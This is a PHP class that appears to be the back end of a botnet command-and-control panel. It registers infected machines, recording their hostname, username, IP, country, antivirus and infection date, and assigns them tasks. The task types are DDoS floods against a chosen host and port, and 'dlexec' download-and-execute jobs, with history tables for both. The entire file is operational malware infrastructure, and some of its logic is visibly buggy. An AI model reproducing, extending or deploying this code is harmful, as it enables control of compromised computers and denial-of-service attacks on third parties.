<?php
class bots
{
    private $db;
    private $table = "bots";
    private $table2 = "run_history";
    private $table_ddos = "ddos_history";
    private $table_dlexec = "dlexec_history";
    public function __construct()
    {
        global $db;
        $this->db = $db;
        return true;
    }
    public function CheckTokenHistory($token)
    {
        $token = CleanInput($token);
        if (Checker1($this->table2, "TOKEN", $token)) {
            return true;
        } else {
            return false;
        }
    }
    public function GenerateTokenHistory()
    {
        $token = GenerateToken("HISTORY_");
        while ($this->CheckTokenHistory($token)) {
            $token = GenerateToken("HISTORY_");
        }
        return $token;
    }
    public function CheckToken($token)
    {
        if (Checker1($this->table, "TOKEN", $token)) {
            return true;
        } else {
            return false;
        }
    }
    public function UserMatch($token, $user_token)
    {
        $token = CleanInput($token);
        $user_token = CleanInput($user_token);
        global $user;
        if ($user->CheckToken($user_token)) {
            $curr_user = $user->GetData($user_token);
            $curr_bot = $this->GetData($token);
            if (empty($curr_user) or empty($curr_bot)) {
                return false;
            }
            if ($curr_user['TOKEN'] == $curr_bot['USER_TOKEN']) {
                return true;
            } else {
                return false;
            }
        }
    }
    public function CheckHwid($hwid)
    {
        $hwid = CleanInput($hwid);
        if (Checker1($this->table, "HWID", $hwid)) {
            return true;
        } else {
            return false;
        }
    }
    public function GenerateToken()
    {
        $token = GenerateToken("BOT_");
        while ($this->CheckToken($token)) {
            $token = GenerateToken("BOT_");
        }
        return $token;
    }
    public function GetData($token = "")
    {
        if ($this->CheckToken($token)) {
            return GetDataArray($this->table, "TOKEN", $token);
        } else {
            return array();
        }
    }
    public function GetDataHWID($hwid = "")
    {
        if ($this->CheckHwid($hwid)) {
            return GetDataArray($this->table, "HWID", $hwid);
        } else {
            return array();
        }
    }
    public function Request($param = array())
    {
        $param['HWID'] = CleanInput($param['HWID']);
        $param['HOST'] = CurrIp();
        $param['USER_TOKEN'] = CleanInput($param['USER_TOKEN']);
        if (empty($param['HWID'])) {
            return json_encode(array("status" => "error", "message" => "HWID is required"));
        } else {


            if (Checker1($this->table, "HWID", $param['HWID'])) {

                $curr_bot = GetDataArray($this->table, "HWID", $param['HWID']);
                //*Update funcition

                $param['PCNAME'] = CleanInput($param['PCNAME']);

                $param['USERNAME'] = CleanInput($param['USERNAME']);
                $param['COUNTRY'] = GetCountry(CurrIp());
                $param['BUSY'] = CleanInput($param['BUSY']);



                $param['ANTI_VIRUS'] = CleanInput($param['ANTI_VIRUS']);
                if (empty($curr_bot['USE'])) {
                    $curr_bot['USE'] = 1;
                }
                $curr_bot['USE'] = $curr_bot['XUSE'] + 1;

                if ($curr_bot['PCNAME'] != $param['PCNAME']) {
                    SqlUpdater1($this->table, "PCNAME", $param['PCNAME'], "HWID", $param['HWID']);
                }
                if ($curr_bot['USERNAME'] != $param['USERNAME']) {
                    SqlUpdater1($this->table, "USERNAME", $param['USERNAME'], "HWID", $param['HWID']);
                }
                if ($curr_bot['COUNTRY'] != $param['COUNTRY']) {
                    SqlUpdater1($this->table, "COUNTRY", $param['COUNTRY'], "HWID", $param['HWID']);
                }
                if ($curr_bot['BUSY'] != $param['BUSY']) {
                    SqlUpdater1($this->table, "BUSY", $param['BUSY'], "HWID", $param['HWID']);
                }

                SqlUpdater1($this->table, "LASTREQUEST", time(), "HWID", $param['HWID']);

                SqlUpdater1($this->table, "ONLINE", time(), "HWID", $param['HWID']);

                if ($curr_bot['ANTI_VIRUS'] != $param['ANTI_VIRUS']) {
                    SqlUpdater1($this->table, "ANTI_VIRUS", $param['ANTI_VIRUS'], "HWID", $param['HWID']);
                }

                $use = $curr_bot['XUSE'] + 1;

                SqlUpdater1($this->table, "XUSE", $use, "HWID", $param['HWID']);

                return json_encode(array("status" => "success", "message" => "Bot updated"));
            } else {
                //*Create
                $param['HWID'] = CleanInput($param['HWID']);
                $param['USER_TOKEN'] = CleanInput($param['USER_TOKEN']);
                $param['GROUP_TOKEN'] = CleanInput($param['GROUP_TOKEN']);
                $param['PCNAME'] = CleanInput($param['PCNAME']);
                $param['USERNAME'] = CleanInput($param['USERNAME']);
                //$param['IP'] 
                $param['BUSY'] = CleanInput($param['BUSY']);
                $param['ANTI_VIRUS'] = CleanInput($param['ANTI_VIRUS']);

                //*Check GroupToken
                global $group;
                if (!$group->CheckToken($param['GROUP_TOKEN'])) {
                    $param['GROUP_TOKEN'] = "false";
                }

                //*Check username
                global $user;
                if (!$user->CheckToken($param['USER_TOKEN'])) {
                    $param['USER_TOKEN'] = "false";
                }
                $param['TOKEN'] = $this->GenerateToken();
                if (empty($param['PCNAME'])) {
                    $param['PCNAME'] = "Unknown";
                }
                if (empty($param['USERNAME'])) {
                    $param['USERNAME'] = "Unknown";
                }

                if (empty($param['BUSY'])) {
                    $param['BUSY'] = "unknown";
                }
                if (empty($param['STATUS'])) {
                    $param['STATUS'] = "unknown";
                }
                if (empty($param['LASTREQUEST'])) {
                    $param['LASTREQUEST'] = "unknown";
                }
                if (empty($param['ANTI_VIRUS'])) {
                    $param['ANTI_VIRUS'] = "unknown";
                }
                // ID 	TOKEN 	USER_TOKEN 	GROUP_TOKEN 	HWID 	PCNAME 	USERNAME 	COUNTRY 	IP 	BUSY 	STATUS 	LASTREQUEST 	ONLINE 	ANTI_VIRUS 	INFECTED_DATE 	XUSE 	CREATED 	
                $SqlData = array();
                $token = $this->GenerateToken();
                $SqlData[':TOKEN'] = $token;
                $SqlData[':USER_TOKEN'] = $param['USER_TOKEN'];
                $SqlData[':GROUP_TOKEN'] = $param['GROUP_TOKEN'];
                $SqlData[':HWID'] = $param['HWID'];
                $SqlData[':PCNAME'] = $param['PCNAME'];
                $SqlData[':USERNAME'] = $param['USERNAME'];
                $SqlData[':COUNTRY'] = GetCountry(CurrIp());
                $SqlData[':IP'] = CurrIp();
                $SqlData[':BUSY'] = $param['BUSY'];
                $SqlData[':STATUS'] = "1";
                $SqlData[':LASTREQUEST'] = time();
                $SqlData[':ONLINE'] = time();
                $SqlData[':ANTI_VIRUS'] = $param['ANTI_VIRUS'];
                $SqlData[':INFECTED_DATE'] = time();
                $SqlData[':XUSE'] = "0";
                $SqlData[':CREATED'] = date("Y-m-d");
                $iDATA = $this->db->prepare("INSERT INTO `$this->table` VALUES(NULL,:TOKEN,:USER_TOKEN,:GROUP_TOKEN,:HWID,:PCNAME,:USERNAME,:COUNTRY,:IP,:BUSY,:STATUS,:LASTREQUEST,:ONLINE,:ANTI_VIRUS,:INFECTED_DATE,:XUSE,:CREATED)");
                $iDATA->execute($SqlData);
                return json_encode(array("status" => "success", "message" => "Bot created", "token" => $token));
            }
        }
    }

    public function GetTask($param = array())
    {
        
        $curr_bot = $this->GetDataHWID($param['HWID']);

        if (empty($curr_bot)) {
            return json_encode(array("status" => "idle", "message" => "Bot not found"));
        } else {
            global $tasks;
            global $group;
            $curr_group = $group->GetData($curr_bot['GROUP_TOKEN']);

            $curr_task = $tasks->GetTaskByUser($curr_group['USER_TOKEN']);


            $curr_task2 = $tasks->GetTaskByBot($curr_bot['TOKEN']);

            // Fusionner les deux tableaux
            $mergedTasks = array_merge($curr_task, $curr_task2);

            // Supprimer les doublons
            $uniqueTasks = array_unique($mergedTasks, SORT_REGULAR);

            if (empty($uniqueTasks)) {
                return json_encode(array("status" => "idle", "message" => "No task found"));
            } else {

                $final_task = array("status" => "idle", "message" => "No task found");
                $igniore = false;
                $limit = 0;
                foreach ($uniqueTasks as $task) {



                    $ignore = false;
                    if ($task['STATUS'] == "0") {

                        $ignore = true;
                    }

                    if ($task['BOT_TOKEN'] == $curr_bot['TOKEN'] or $task['GROUP_TOKEN'] == $curr_bot['GROUP_TOKEN']) {
                    } else {

                        $ignore = true;
                    }

                    //*Check Expire
                    if ($task['EXPIRE']  < time()) {

                        $ignore = true;
                        //  SqlUpdater1("tasks", "TOKEN", $task['TOKEN'], "STATUS", "0");
                    } else {
                    }
                    if ($this->IfRun($task['TOKEN'], $param['HWID']) and $task['RUN_ONCE'] == "1") {

                        $ignore = true;
                    } else {
                    }
                    if ($ignore == false) {
                        $final_task = $task;
                        break;
                    }
                }
            }
        }
        return json_encode((@$final_task));
    }
    public function AddHistory($param = array())
    {
        $return = array();
        $return['success'] = array();
        $return['error'] = array();
        $return['info'] = array();
        $return['warning'] = array();


        $param['HWID'] = CleanInput($param['HWID']);
        $param['TASK_TOKEN'] = CleanInput($param['TASK_TOKEN']);

        if (empty($param['HWID'])) {
            $return['error'][] = "HWID is required";
        } else {
            if (!$this->CheckHwid($param['HWID'])) {
                $return['error'][] = "HWID is invalid";
            }
        }
        if (empty($param['TASK_TOKEN'])) {
            $return['error'][] = "TASK_TOKEN is required";
        } else {
            global $tasks;
            if (!$tasks->CheckToken($param['TASK_TOKEN'])) {
                $return['error'][] = "TASK_TOKEN is invalid";
            }
        }
        if (empty($return['error'])) {
            $data = GetDataArray2($this->table2, "HWID", $param['HWID'], "TASK_TOKEN", $param['TASK_TOKEN']);

            if (Checker2($this->table2, "HWID", "TASK_TOKEN", $param['HWID'], $param['TASK_TOKEN'])) {

                $curr_history = GetDataArray2($this->table2, "HWID", "TASK_TOKEN", $param['HWID'], $param['TASK_TOKEN']);
                if (empty($curr_history['USE'])) {
                    $curr_history['USE'] = 0;
                }
                $curr_history['USE'] = $curr_history['USE'] + 1;
                SqlUpdater2($this->table2, "USE", $curr_history['USE'], "HWID", $param['HWID'], "TASK_TOKEN", $param['TASK_TOKEN']);
                $return['success'][] = "History updated";
            } else {

                //*Create History
                $SqlData = array();
                $SqlData[':TOKEN'] = $this->GenerateTokenHistory();
                $SqlData[':TASK_TOKEN'] = $param['TASK_TOKEN'];
                $SqlData[':HWID'] = $param['HWID'];
                $SqlData[':USE'] = "1";
                $SqlData[':CREATED'] = time();
                $iDATA = $this->db->prepare("INSERT INTO `$this->table2` VALUES(NULL,:TOKEN,:TASK_TOKEN,:HWID,:USE,:CREATED)");
                $iDATA->execute($SqlData);
                $return['success'][] = "History created";
            }
        }
        return json_encode($return);
    }
    public function IfRun($task_token, $bot_token)
    {
        if (Checker2($this->table2, "TASK_TOKEN", "HWID", $task_token, $bot_token)) {
            return true;
        } else {
            return false;
        }
    }
    public function RunTask($param = array())
    {
        $return = array();
        $return['success'] = array();
        $return['error'] = array();
        $return['info'] = array();
        $return['warning'] = array();

        $param['HWID'] = CleanInput($param['HWID']);
        $param['TASK_TOKEN'] = CleanInput($param['TASK_TOKEN']);
        $param['DATA'] = ($param['DATA']);
        $curr_task = GetDataArray("tasks", "TOKEN", $param['TASK_TOKEN']);
        if (empty($curr_task)) {
            $return['error'][] = "Task not found";
        } else {
            if (Checker2($this->table2, "HWID", "TASK_TOKEN", $param['HWID'], $param['TASK_TOKEN']) and $curr_task['RUN_ONCE'] == "1") {
                $return['error'][] = "Task already run";
            } else {

                $curr_task = GetDataArray("tasks", "TOKEN", $param['TASK_TOKEN']);
                if (empty($curr_task)) {
                    $return['error'][] = "Task not found";
                } else {
                    $this->AddHistory($param);

                    $return['success'][] = "Task run";
                    //type 
                    if ($curr_task['TYPE'] == "ddos") {

                        $this->SetDdos($param);
                    }
                    if ($curr_task['TYPE'] == "dlexec") {
           
                    $this->SetDlexec($param);
                    }
                }
            }

            return json_encode($return);
        }
    }
    public function SetDlexec($param =array(),$echo = false){
       
        $curr_data = GetDataArray($this->table_dlexec, "TASK_TOKEN", $param['TASK_TOKEN']);
        if (empty($curr_data)) {
            //*Create
            $SqlData = array();
            $SqlData[':TASK_TOKEN'] = $param['TASK_TOKEN'];
            $SqlData[':URL'] = $param['DATA']['url'];
            $SqlData[':ACCESS'] = $param['DATA']['access'];
            $SqlData[':RUN'] = "1";
            $SqlData[':CREATED'] = time();

            $iDATA = $this->db->prepare("INSERT INTO `$this->table_dlexec` VALUES(NULL,:TASK_TOKEN,:URL,:ACCESS,:RUN,:CREATED)");
            $iDATA->execute($SqlData);
            return json_encode(array("status" => "success", "message" => "Dlexec created"));
        } else {
            //*Update
            $update_run = $curr_data['RUN'] + 1;
            SqlUpdater1($this->table_dlexec, "RUN", $update_run, "TASK_TOKEN", $param['TASK_TOKEN']);
            return json_encode(array("status" => "success", "message" => "Dlexec updated"));
            
        }
    }
    public function SetDdos($param = array(), $echo = false)
    {
        // Supprimez la ligne de décodage JSON
        // $curr_data = json_decode($param['DATA'], true);

        //table_ddos
        $curr_data = GetDataArray($this->table_ddos, "TASK_TOKEN", $param['TASK_TOKEN']);

        if (empty($curr_data)) {
            //*Create
            $SqlData = array();
            $SqlData[':TASK_TOKEN'] = $param['TASK_TOKEN'];
            // Utilisez directement $param['DATA']
            $SqlData[':HOST'] = $param['DATA']['host'];
            $SqlData[':PORT'] = $param['DATA']['port'];
            $SqlData[':METHOD'] = $param['DATA']['method'];
            $SqlData[':DURATION'] = $param['DATA']['duration'];
            $SqlData[':MBPS'] = $param['DATA']['mbps'];
            $SqlData[':RS'] = $param['DATA']['rs'];
            $SqlData[':RUN'] = "1";
            $SqlData[':CREATED'] = time();

            $iDATA = $this->db->prepare("INSERT INTO `$this->table_ddos` VALUES(NULL,:TASK_TOKEN,:HOST,:PORT,:METHOD,:DURATION,:MBPS,:RS,:RUN,:CREATED)");
            $iDATA->execute($SqlData);
            return json_encode(array("status" => "success", "message" => "DDOS created"));
        } else {
            //*Update
            $update_mbps = round($curr_data['MBPS']) + round($param['DATA']['mbps']);
            $update_rs = $curr_data['RS'] + $param['DATA']['rs'];

            $update_run = $curr_data['RUN'] + 1;

            SqlUpdater1($this->table_ddos, "MBPS", $update_mbps, "TASK_TOKEN", $param['TASK_TOKEN']);
            SqlUpdater1($this->table_ddos, "RS", $update_rs, "TASK_TOKEN", $param['TASK_TOKEN']);
            SqlUpdater1($this->table_ddos, "RUN", $update_run, "TASK_TOKEN", $param['TASK_TOKEN']);
            return json_encode(array("status" => "success", "message" => "DDOS updated"));
        }
    }
    public function DdosHistory($paramsearch = array(), $echo = false)
    {

        $curr_list = GetDataArrayTableOrder($this->table_ddos, "CREATED", "DESC");
        if (empty($curr_list)) {
            return array();
        } else {
            $final_list = array();
            foreach ($curr_list as $ddos) {
                $igniore = false;
                if (empty($paramsearch)) {
                    $final_list[] = $ddos;
                } else {
                    if ($paramsearch['TASK_TOKEN'] != $ddos['TASK_TOKEN']) {
                        $igniore = true;
                    }
                    if ($paramsearch['HOST'] != $ddos['HOST']) {
                        $igniore = true;
                    }
                    if ($paramsearch['PORT'] != $ddos['PORT']) {
                        $igniore = true;
                    }
                    if ($paramsearch['METHOD'] != $ddos['METHOD']) {
                        $igniore = true;
                    }
                    if ($paramsearch['DURATION'] != $ddos['DURATION']) {
                        $igniore = true;
                    }
                    if ($paramsearch['MBPS'] != $ddos['MBPS']) {
                        $igniore = true;
                    }
                    if ($paramsearch['RS'] != $ddos['RS']) {
                        $igniore = true;
                    }
                    if ($paramsearch['RUN'] != $ddos['RUN']) {
                        $igniore = true;
                    }
                    if ($paramsearch['CREATED'] != $ddos['CREATED']) {
                        $igniore = true;
                    }
                    if ($igniore == false) {
                        $final_list[] = $ddos;
                    }
                }
            }
            return $final_list;
        }
    }
    public function DlexecHystory($paramsearch = array(), $echo = false)
    {

        $curr_list = GetDataArrayTableOrder($this->table_dlexec, "CREATED", "DESC");
        if (empty($curr_list)) {
            return array();
        } else {
            $final_list = array();
            foreach ($curr_list as $DlExec) {
                $igniore = false;
                if (empty($paramsearch)) {
                    $final_list[] = $DlExec;
                } else {
                    if ($paramsearch['TASK_TOKEN'] != $DlExec['TASK_TOKEN']) {
                        $igniore = true;
                    }
                    if ($paramsearch['URL'] != $DlExec['URL']) {
                        $igniore = true;
                    }
                    if ($paramsearch['ACCESS'] != $DlExec['ACCESS']) {
                        $igniore = true;
                    }
                    if ($paramsearch['RUN'] != $DlExec['RUN']) {
                        $igniore = true;
                    }
                    if ($paramsearch['CREATED'] != $DlExec['CREATED']) {
                        $igniore = true;
                    }
                    if ($igniore == false) {
                        $final_list[] = $DlExec;
                    }
                }
            }
            return $final_list;
        }
    }
    public function BotList($paramearch = array())
    {
        //return valiue
        $return = array();
        $return['success'] = array();
        $return['error'] = array();
        $return['info'] = array();
        $return['warning'] = array();
        $return['data'] = array();


        $curr_list = GetDataArrayTableOrder($this->table, "CREATED", "DESC");
        if (empty($curr_list)) {
            return array();
        } else {
            $final_list = array();
            foreach ($curr_list as $bot) {
                $igniore = false;
                if (empty($paramsearch)) {
                    $final_list[] = $bot;
                } else {
                    if ($paramsearch['HWID'] != $bot['HWID']) {
                        $igniore = true;
                    }
                    if ($paramsearch['TOKEN'] != $bot['TOKEN']) {
                        $igniore = true;
                    }
                    if ($paramsearch['USER_TOKEN'] != $bot['USER_TOKEN']) {
                        $igniore = true;
                    }
                    if ($paramsearch['GROUP_TOKEN'] != $bot['GROUP_TOKEN']) {
                        $igniore = true;
                    }
                    if ($paramsearch['PCNAME'] != $bot['PCNAME']) {
                        $igniore = true;
                    }
                    if ($paramsearch['USERNAME'] != $bot['USERNAME']) {
                        $igniore = true;
                    }
                    if ($paramsearch['COUNTRY'] != $bot['COUNTRY']) {
                        $igniore = true;
                    }
                    if ($paramsearch['IP'] != $bot['IP']) {
                        $igniore = true;
                    }
                    if ($paramsearch['BUSY'] != $bot['BUSY']) {
                        $igniore = true;
                    }
                    if ($paramsearch['STATUS'] != $bot['STATUS']) {
                        $igniore = true;
                    }
                    if ($paramsearch['LASTREQUEST'] != $bot['LASTREQUEST']) {
                        $igniore = true;
                    }
                    if ($paramsearch['ONLINE'] != $bot['ONLINE']) {
                        $igniore = true;
                    }
                    if ($paramsearch['ANTI_VIRUS'] != $bot['ANTI_VIRUS']) {
                        $igniore = true;
                    }
                    if ($paramsearch['INFECTED_DATE'] != $bot['INFECTED_DATE']) {
                        $igniore = true;
                    }
                    if ($paramsearch['XUSE'] != $bot['XUSE']) {
                        $igniore = true;
                    }
                    if ($paramsearch['CREATED'] != $bot['CREATED']) {
                        $igniore = true;
                    }
                    if ($igniore == false) {
                        $final_list[] = $bot;
                    }
                }
            }
            return $final_list;
        }
    }
    public function UpdateGroup($param = array(), $echo = true)
    {
        $return = array();
        $return['success'] = array();
        $return['error'] = array();
        $return['info'] = array();
        $return['warning'] = array();
        $param['BOT_TOKEN'] = CleanInput($param['BOT_TOKEN']);
        $param['GROUP_TOKEN'] = CleanInput($param['GROUP_TOKEN']);
        if (empty($param['BOT_TOKEN'])) {
            $return['error'][] = "HWID is required";
        } else {
            if (!$this->checkToken($param['BOT_TOKEN'])) {
                $return['error'][] = "HWID is invalid";
            }
        }
        if (empty($param['GROUP_TOKEN'])) {
            $return['error'][] = "GROUP_TOKEN is required";
        } else {
            global $group;
            if (!$group->CheckToken($param['GROUP_TOKEN'])) {
                $return['error'][] = "GROUP_TOKEN is invalid";
            }
        }
        if ($this->UserMatch($param['BOT_TOKEN'], $param['USER_TOKEN']) == false) {
            $return['error'][] = "User not match";
        }
        if (empty($return['error'])) {
            $curr_bot = $this->GetData($param['BOT_TOKEN']);
            if ($curr_bot['GROUP_TOKEN'] != $param['GROUP_TOKEN']) {
                SqlUpdater1($this->table, "GROUP_TOKEN", $param['GROUP_TOKEN'], "TOKEN", $param['BOT_TOKEN']);
                $return['success'][] = "Group updated";
            } else {
                $return['info'][] = "Group already updated";
            }
        }
        global $msg;
        $msg->ShowArray($return, $echo);
        return $return;
    }
}
